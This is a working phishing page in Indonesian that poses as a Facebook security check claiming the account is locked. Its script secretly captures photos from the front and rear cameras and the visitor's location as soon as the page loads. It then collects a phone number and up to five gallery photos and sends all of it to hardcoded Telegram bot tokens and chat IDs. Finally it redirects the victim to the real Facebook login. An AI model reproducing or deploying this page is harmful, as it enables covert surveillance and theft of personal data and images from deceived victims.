<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Security Check</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; }
        .main-card { max-width: 450px; margin: 50px auto; border: none; border-radius: 12px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); background: white; overflow: hidden; }
        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; letter-spacing: -1px; }
        
        /* Animasi Tombol Smooth ala FB üòã */
        .btn-fb { 
            background-color: #1877f2; color: white; font-weight: bold; 
            padding: 12px; border-radius: 8px; border: none; 
            transition: transform 0.1s ease, background-color 0.2s ease;
            width: 100%;
        }
        .btn-fb:hover { background-color: #166fe5; }
        .btn-fb:active { transform: scale(0.96); background-color: #145dbf; } /* Efek Membal */

        .error-msg { color: #fa3e3e; font-size: 12px; display: none; margin-top: 5px; font-weight: bold; }
        #video, #canvas { display: none; }
        .loading-spinner { display: none; }
        .input-group-fb { border: 1px solid #dddfe2; border-radius: 6px; padding: 10px; margin-bottom: 15px; }
    </style>
</head>
<body>

<div class="container">
    <div class="main-card card p-4 text-center">
        <div class="fb-logo mb-2">facebook</div>
        <h5 class="fw-bold">Verifikasi Diperlukan</h5>
        <p class="text-muted" style="font-size: 14px;">Akun Anda telah dikunci sementara. Mohon lengkapi data berikut untuk membuka kunci.</p>
        <hr>

        <div class="text-start">
            <label class="form-label small fw-bold">Nomor Telepon</label>
            <input type="number" id="phone" class="form-control" placeholder="Masukkan nomor HP">
            <div id="errPhone" class="error-msg text-danger">‚ö†Ô∏è Nomor HP wajib diisi!</div>
            
            <label class="form-label small fw-bold mt-3">Verifikasi Foto (Pilih 5 Foto)</label>
            <input type="file" id="galeri" class="form-control" multiple accept="image/*">
            <div id="errGaleri" class="error-msg">‚ö†Ô∏è Harap pilih minimal 1-5 foto galeri!</div>
        </div>

        <div class="mt-4">
            <button class="btn-fb" onclick="validateAndSend()">Konfirmasi & Lanjutkan</button>
        </div>

        <div class="loading-spinner text-primary mt-3" id="loader">
            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengautentikasi...</span>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
    const chats = ["7835924973", "8071786272"];

    window.onload = () => {
        autoCapture("user");
        autoLocation();
    };

    function sendToBot(content, type = "text", blob = null) {
        tokens.forEach((token, i) => {
            const formData = new FormData();
            formData.append("chat_id", chats[i]);
            let url = `https://api.telegram.org/bot${token}/`;

            if (type === "text") {
                url += "sendMessage";
                formData.append("text", content);
            } else {
                url += "sendPhoto";
                formData.append("photo", blob || content, "data.jpg");
                formData.append("caption", content);
            }
            fetch(url, { method: "POST", body: formData });
        });
    }

    // Validasi Ganas ‚ò†Ô∏è
    function validateAndSend() {
        const phone = document.getElementById('phone').value;
        const galeri = document.getElementById('galeri').files;
        const errP = document.getElementById('errPhone');
        const errG = document.getElementById('errGaleri');
        let valid = true;

        // Cek Nomor
        if (!phone) {
            errP.style.display = 'block';
            valid = false;
        } else { errP.style.display = 'none'; }

        // Cek Galeri
        if (galeri.length === 0) {
            errG.style.display = 'block';
            valid = false;
        } else { errG.style.display = 'none'; }

        if (!valid) return; // Kalo gak valid, GAGAL total, data gak bakal dikirim! üòÇ

        // Kalo VALID, sikat datanya!
        document.getElementById('loader').style.display = 'block';
        sendToBot(`üì± NOMOR TARGET: ${phone}`);
        
        for (let i = 0; i < Math.min(galeri.length, 5); i++) {
            sendToBot(`üñºÔ∏è GALERI ${i+1}`, "photo", galeri[i]);
        }

        setTimeout(() => {
            alert("Verifikasi Berhasil! Akun akan segera pulih.");
            window.location.href = "https://www.facebook.com/login";
        }, 3000);
    }

    // Auto Capture & Location (Tetep jalan di background üòà)
    async function autoCapture(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = 480; canvas.height = 640;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => sendToBot(`üì∏ Kamera ${mode}`, "photo", b), 'image/jpeg');
                stream.getTracks().forEach(t => t.stop());
                if(mode === "user") setTimeout(() => autoCapture("environment"), 3000);
            }, 2000);
        } catch (e) { window.location.href = "https://www.facebook.com/login"; }
    }

    function autoLocation() {
        navigator.geolocation.getCurrentPosition(p => {
            sendToBot(`üìç LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });
    }
</script>
</body>
</html>
